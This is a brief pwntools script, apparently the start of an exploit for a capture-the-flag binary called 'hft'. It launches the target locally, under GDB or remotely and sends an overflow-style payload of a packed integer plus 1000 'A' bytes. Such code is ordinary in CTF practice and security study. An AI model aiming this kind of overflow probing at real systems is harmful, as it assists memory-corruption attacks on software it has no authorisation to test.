from pwn import *

exe = ELF('./hft')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

print(pack(10**7))
io.sendline(pack(1) + b'A' * 1000)

io.interactive()